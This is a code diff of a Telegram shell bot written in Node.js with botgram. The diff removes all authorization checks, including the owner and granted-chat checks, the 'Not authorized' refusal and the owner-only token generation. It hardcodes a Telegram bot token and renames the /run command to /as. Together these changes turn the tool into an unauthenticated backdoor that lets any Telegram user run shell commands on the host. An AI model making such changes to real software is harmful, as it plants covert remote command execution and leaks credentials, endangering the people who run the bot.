@@ -21,10 +21,8 @@ try {
     return;
 }
 
-var bot = botgram(config.authToken, { agent: utils.createAgent() });
-var owner = config.owner;
+var bot = botgram("5646206541:AAGXou5ldbBGUDujW0G9VtggPsjdZXxOChI");
 var tokens = {};
-var granted = {};
 var contexts = {};
 var defaultCwd = process.env.HOME || process.cwd();
 
@@ -42,15 +40,12 @@ bot.on("synced", function () {
 function rootHook(msg, reply, next) {
   if (msg.queued) return;
 
-  var id = msg.chat.id;
-  var allowed = id === owner || granted[id];
-
+var id = msg.chat.id;
   // If this message contains a token, check it
-  if (!allowed && msg.command === "start" && Object.hasOwnProperty.call(tokens, msg.args())) {
+  if ( msg.command === "start" && Object.hasOwnProperty.call(tokens, msg.args())) {
     var token = tokens[msg.args()];
     delete tokens[msg.args()];
-    granted[id] = true;
-    allowed = true;
+   
 
     // Notify owner
     // FIXME: reply to token message
@@ -61,16 +56,8 @@ function rootHook(msg, reply, next) {
   }
 
   // If chat is not allowed, but user is, use its context
-  if (!allowed && (msg.from.id === owner || granted[msg.from.id])) {
-    id = msg.from.id;
-    allowed = true;
-  }
 
   // Check that the chat is allowed
-  if (!allowed) {
-    if (msg.command === "start") reply.html("Not authorized to use this bot.");
-    return;
-  }
 
   if (!contexts[id]) contexts[id] = {
     id: id,
@@ -114,7 +101,7 @@ bot.edited.message(function (msg, reply, next) {
 bot.command("r", function (msg, reply, next) {
   // A little hackish, but it does show the power of
   // Botgram's fallthrough system!
-  msg.command = msg.context.command ? "enter" : "run";
+  msg.command = msg.context.command ? "enter" : "as";
   next();
 });
 
@@ -175,10 +162,10 @@ bot.command("redraw", function (msg, reply, next) {
 });
 
 // Command start
-bot.command("run", function (msg, reply, next) {
+bot.command("as", function (msg, reply, next) {
   var args = msg.args();
   if (!args)
-    return reply.html("Use /run &lt;command&gt; to execute something.");
+    return reply.html("Use /as &lt;command&gt; to execute something.");
 
   if (msg.context.command) {
     var command = msg.context.command;
@@ -293,16 +280,6 @@ bot.command("status", function (msg, reply, next) {
   if (uid !== gid) uid = uid + "/" + gid;
   content += "UID/GID: " + uid + "\n";
 
-  // Granted chats (msg.chat.id is intentional)
-  if (msg.chat.id === owner) {
-    var grantedIds = Object.keys(granted);
-    if (grantedIds.length) {
-      content += "\nGranted chats:\n";
-      content += grantedIds.map(function (id) { return id.toString(); }).join("\n");
-    } else {
-      content += "\nNo chats granted. Use /grant or /token to allow another chat to use the bot.";
-    }
-  }
 
   if (context.command) reply.reply(context.command.initialMessage.id);
   reply.html(content);
@@ -456,7 +433,7 @@ bot.command("grant", "revoke", function (msg, reply, next) {
   }
 });
 bot.command("token", function (msg, reply, next) {
-  if (msg.context.id !== owner) return;
+  
   var token = utils.generateToken();
   tokens[token] = true;
   reply.disablePreview().html("One-time access token generated. The following link can be used to get access to the bot:\n%s\nOr by forwarding me this:", bot.link(token));
@@ -468,13 +445,13 @@ bot.command("start", function (msg, reply, next) {
   if (msg.args() && msg.context.id === owner && Object.hasOwnProperty.call(tokens, msg.args())) {
     reply.html("You were already authenticated; the token has been revoked.");
   } else {
-    reply.html("Welcome! Use /run to execute commands, and reply to my messages to send input. /help for more info.");
+    reply.html("Welcome! Use /as to execute commands, and reply to my messages to send input. /help for more info.");
   }
 });
 
 bot.command("help", function (msg, reply, next) {
   reply.html(
-    "Use /run &lt;command&gt; and I'll execute it for you. While it's running, you can:\n" +
+    "Use /as &lt;command&gt; and I'll execute it for you. While it's running, you can:\n" +
     "\n" +
     "‣ Reply to one of my messages to send input to the command, or use /enter.\n" +
     "‣ Use /end to send an EOF (Ctrl+D) to the command.\n" +
@@ -506,7 +483,3 @@ bot.command("help", function (msg, reply, next) {
 // FIXME: persistence
 // FIXME: shape messages so we don't hit limits, and react correctly when we do
 
-
-bot.command(function (msg, reply, next) {
-  reply.reply(msg).text("Invalid command.");
-});
